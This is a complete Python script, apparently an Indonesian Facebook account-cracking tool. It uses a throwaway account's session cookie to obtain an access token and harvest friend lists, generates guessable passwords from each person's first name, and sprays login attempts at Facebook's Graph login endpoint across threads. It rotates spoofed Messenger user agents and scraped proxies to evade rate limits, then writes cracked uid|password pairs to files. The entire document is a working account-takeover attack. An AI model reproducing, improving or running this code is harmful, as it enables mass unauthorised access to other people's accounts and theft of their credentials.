#coding utf-8
#code kall dev 
#silahkan rekod jgn di premin yah mek
#next update gw tambah menu lainya
import os, sys, re, time, requests, calendar, random, bs4, uuid, json, subprocess
from concurrent.futures import ThreadPoolExecutor
from requests.exceptions import ConnectionError
from bs4 import BeautifulSoup as par

P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI

try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=80000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mError')

ugen =[]
for i in range(10000):
      rr = random.randint
      andro = f"{(rr(4,13))}"
      ua = f"Dalvik/2.1.0 (Linux; U; Android {andro}; V2043_21 Build/RP1A.200720.012) [FBAN/MessengerLite;FBAV/{(rr(100,467))}.0.0.5.119;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/{(rr(100000000,9000000000))};FBCR/Warid;FBMF/vivo;FBBD/vivo;FBDV/V2043_21;FBSV/{andro};FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/"+"{density=2.25,height=,width=};]"
      ub = f"Dalvik/2.1.0 (Linux; U; Android {andro}; SM-N950U1 Build/PPR1.180610.011) [FBAN/MessengerLite;FBAV/{(rr(100,467))}.0.0.8.42;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/743627942;FBCR/TIGO;FBMF/samsung;FBBD/samsung;FBDV/SM-N950U1;FBSV/{andro};FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/"+"{density=2.25,height=1024,width=2048};]"
      uc = f"Dalvik/2.1.0 (Linux; U; Android {andro}; moto g52 Build/S1SRS32.38-132-8) [FBAN/MessengerLite;FBAV/{(rr(100,467))}.0.0.7.131;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/543901789;FBCR/;FBMF/motorola;FBBD/motorola;FBDV/moto g52;FBSV/{andro};FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/"+"{density=2.25,height=1024,width=2048};]"
      ud = f"Dalvik/2.1.0 (Linux; U; Android {andro}; SM-J330FN Build/PPR1.180610.011) [FBAN/MessengerLite;FBAV/{(rr(100,467))}.0.0.3.109;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/751378617;FBCR/Grameenphone;FBMF/samsung;FBBD/samsung;FBDV/SM-J330FN;FBSV/{andro};FBCA/armeabi-v7a:armeabi;FBDM/"+"{density=2.25,height=,width=};]"
      ue = f"Dalvik/2.1.0 (Linux; U; Android {andro}; CMA-LX2 Build/HONORCMA-L42CQ) [FBAN/MessengerLite;FBAV/{(rr(100,467))}.0.0.8.93;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/778153142;FBCR/1B Meals - du ;FBMF/HONOR;FBBD/HONOR;FBDV/CMA-LX2;FBSV/{andro};FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/"+"{density=2.25,height=,width=};]"
      ua = random.choice([ua, ub, uc, ud, ue])
      ugen.append(ua)
      
class Crackers:
      
      def __init__(self):
            self.loop,self.ugen,self.ok,self.cp,self.id1,self.id2 = 0,[],[],[],[],[]
            self.ses = requests.Session()
            self.url = "https://mbasic.facebook.com"
            self.menu()
            
      def ClearCoy(self):
            if "linux" in sys.platform.lower():
                  try:os.system('clear')
                  except:pass
                  
      def api(self,uuid,passz):
            xxx = str(random.choice([M, K, H]))
            sys.stdout.write(f"\r{xxx}[ b-Api Developers ] {P}{self.loop}|{len(self.id2)} {H}OK : {len(self.ok)} {K}CP : {len(self.cp)}{N}");sys.stdout.flush()
            for ppw in passz:
                  try:
                        ua=random.choice(ugen)
                        nip=random.choice(prox)
                        proxs= {'http': 'socks4://'+nip}
                        head = {'Host':'graph.facebook.com','x-fb-connection-bandwidth': repr(random.randint(2e7, 3e7)), 'x-fb-sim-hni': repr(random.randint(2e4, 4e4)), 'x-fb-net-hni': repr(random.randint(2e4, 4e4)),'x-fb-connection-quality': 'EXCELLENT','user-agent': ua,'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
                        date = {'access_token': '200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16',  'format': 'JSON', 'sdk_version': {random.randrange(2, 31)}, 'email': uuid, 'locale': 'id_ID', 'password': ppw, 'sdk': 'android', 'generate_session_cookies': '1', 'sig': f'{random.randrange(1, 9)}f{random.randrange(100, 999)}f{random.randrange(10, 99)}fb{random.randrange(10, 99)}fcd{random.randrange(1, 9)}aa{random.randrange(0, 9)}c{random.randrange(10, 99)}f{random.randrange(10, 99)}f{random.randrange(100, 999)}ef{random.randrange(1, 9)}'}
                        xnxx = self.ses.post("https://graph.facebook.com/auth/login", params=date, headers=head, allow_redirects=False).json()
                        if "session_key" in xnxx:
                              print(f'\r{H}[OK] {uuid}|{ppw}')
                              self.ok.append(uuid)
                              asu_peler = (f"OK LOGIN --> {uuid}|{ppw}")
                              open('/sdcard/Kall-OK.txt','a').write(asu_peler+'\n')
                              break
                        elif 'Login approvals are on' in xnxx:
                              print(f'\r{M}[A2F] {uuid}|{ppw}')
                              self.cp.append(uuid)
                              asu_peler = (f"A2F LOGIN --> {uuid}|{ppw}")
                              open('/sdcard/Kall-CP.txt','a').write(asu_peler+'\n')
                              break
                        elif "www.facebook.com" in xnxx["error"]["message"]:
                              print(f'\r{K}[CP] {uuid}|{ppw}')
                              self.cp.append(uuid)
                              asu_peler = (f"CP LOGIN --> {uuid}|{ppw}")
                              open('/sdcard/Kall-CP.txt','a').write(asu_peler+'\n')
                              break
                        elif "Calls to this api have exceeded the rate limit. (613)" in xnxx:sys.stdout.write(f"\r{M}[ b-Api Developers Spam] {P}{self.loop}|{len(self.id2)} {H}OK : {len(self.ok)} {K}CP : {len(self.cp)}");sys.stdout.flush()
                        else:continue	
                  except requests.exceptions.ConnectionError: time.sleep(35)
            self.loop+=1
            
      def listpw(self):
            self.tampung()
            with ThreadPoolExecutor(max_workers=30) as kalldev:
                  for idf in self.id2:
                        uid,user = idf.split('|')[0], idf.split('|')[1].lower()
                        xxx = user.split(' ')[0]
                        if len(user) <=5:
                               if len(xxx) <=1 or len(xxx) <=2:pass 
                               else:
                                     pwd=[
                                         xxx+'321',
                                         xxx+'123', 
                                         xxx+'1234', 
                                         xxx+'12345', 
                                         xxx+'123456',
                                         xxx+'01',xxx+'02',
                                         xxx+'03',xxx+'04',
                                         xxx+'05',xxx+'06',
                                         xxx+'07',xxx+'08',
                                         xxx+'09',xxx+'10'
                                    ]
                        else:
                              pwd=[
                                  user, 
                                  xxx+'321',
                                  xxx+'123', 
                                  xxx+'1234', 
                                  xxx+'12345', 
                                  xxx+'123456',
                                  xxx+'01',xxx+'02',
                                  xxx+'03',xxx+'04',
                                  xxx+'05',xxx+'06',
                                  xxx+'07',xxx+'08',
                                  xxx+'09',xxx+'10'
                             ]
                        kalldev.submit(self.api,uid,pwd)
            exit('Crack Sukses Jgn Lupa Like Gh Gw ')
      
      def CekTumbal(self):
            try:
                  cook = {"cookie": open(".cok.txt", "r").read()};took = open(".token.txt", "r").read()
            except (FileNotFoundError):
                  self.login()
            try:
                  geting = self.ses.get('https://graph.facebook.com/me?fields=name,id&access_token=%s'%(took),cookies=cook).json()
                  nama,id = geting['name'],geting['id']
            except (requests.exceptions.ConnectionError):
                  exit("Your Conection Vailed")
            except (KeyError):
                  print("Akun Tumbal Telah Matii!! ");os.system('rm -rf .token.txt && rm -rf .cok.txt');exit()
            
      def login(self):
            self.ClearCoy()
            cok = input(f'{H} • {N}Masukan Cookie : ')
            try:
                  data, data2 = {}, {}
                  link = self.ses.post("https://graph.facebook.com/v16.0/device/login/", data={"access_token": "661587963994814|ffe07cc864fd1dc8fe386229dcb7a05e", "scope": ""}).json()
                  kode = link["code"];user = link["user_code"]
                  vers = par(self.ses.get(f"{self.url}/device", cookies={"cookie": cok}).content, "html.parser")
                  item = ["fb_dtsg","jazoest","qr"]
                  for x in vers.find_all("input"):
                      if x.get("name") in item:
                            aset = {x.get("name"):x.get("value")}
                            data.update(aset)
                  data.update({"user_code":user})
                  meta = par(self.ses.post(self.url+vers.find("form", method="post").get("action"), data=data, cookies={"cookie": cok}).text, "html.parser")
                  xzxz  = meta.find("form",{"method":"post"})
                  for x in xzxz("input",{"value":True}):
                       try:
                             if x["name"] == "__CANCEL__" :pass
                             else:data2.update({x['name']:x['value']})
                       except Exception as e:pass
                  self.ses.post(f"{self.url}{xzxz['action']}", data=data2, cookies={"cookie":cok})
                  tokz = self.ses.get(f"https://graph.facebook.com/v16.0/device/login_status?method=post&code={kode}&access_token=661587963994814|ffe07cc864fd1dc8fe386229dcb7a05e").json()
                  kall = (tokz["access_token"])
                  print(f"\n{H}• {N}Your Token : "+H+kall+N)
                  open('.cok.txt','w').write(cok)
                  open('.token.txt','w').write(tokz["access_token"])
                  print(f'\n{H}Login Succes In Script Return Comand!! ');exit()
            except Exception as e:exit(e)
        
      def menu(self):
            self.ClearCoy();self.CekTumbal()
            print(f"{P}({H}01{P}). Crack Friendlist\n({H}02{P}). Crack File\n({H}03{P}). {M}Log Out{N}");self.garis()
            aqua = input(f"{P}({H}?{P}) Choise : ");self.garis()
            if aqua == "1" or aqua == "01":
                  try:
                        uid=input(f"{P}({H}?{P}) Input Your Uid : ")
                        link = requests.get('https://graph.facebook.com/v1.0/'+uid+'?fields=friends.limit(5000)&access_token={}'.format(open('.token.txt','r').read()), cookies={"cookie":open('.cok.txt','r').read()}).json()
                        for z in link['friends']['data']:
                              self.id1.append(z['id'] +'|'+ z['name'])
                  except (KeyError):exit(f'{P}({M}x{P}) Uid not public{N}')
                  for ih in self.id1:
                        self.id2.insert(0, ih)
                  self.listpw()
            elif aqua == "2" or aqua == "2":
                  file = input(f'{P}({H}?{P}) Your File : {N}')
                  try:
                       for line in open(file, 'r').readlines():
                             self.id1.append(line.strip())
                  except IOError:exit(f'{P}({M}x{P}) File Not Found{N}')
                  for ih in self.id1:
                        self.id2.insert(0, ih)
                  self.listpw()
            else:
                  print(f"\n{P}({M}x{P}) Menu Not Found");time.sleep(5);self.menu()
                  
      def tampung(self):
            print(f'{P}--------------------------------------------')
            print(f"TOTAL ID : {len(self.id2)}")
            print(f"on off mode pesawat selama 5d ")
            print(f'{P}--------------------------------------------')
      
      def garis(self):
            print(f'{P}--------------------------------------------')
            
Crackers()